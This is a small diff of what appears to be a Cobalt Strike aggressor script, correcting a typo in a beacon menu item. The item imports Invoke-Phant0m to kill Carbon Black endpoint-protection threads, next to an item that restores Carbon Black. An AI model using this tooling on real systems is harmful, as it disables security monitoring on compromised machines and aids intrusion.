@@ -73,7 +73,7 @@ popup beacon_bottom {
 					bpowershell($bid, "Restore-CarbonBlack");
 				}
 			}
-			item "Kill Kill Carbon Black Threads with Invoke-Phant0m" {
+			item "Kill Carbon Black Threads with Invoke-Phant0m" {
 				local('$bid');
 				foreach $bid ($1){
 					binput($1, "powershell-import Invoke-Phant0m.ps1");
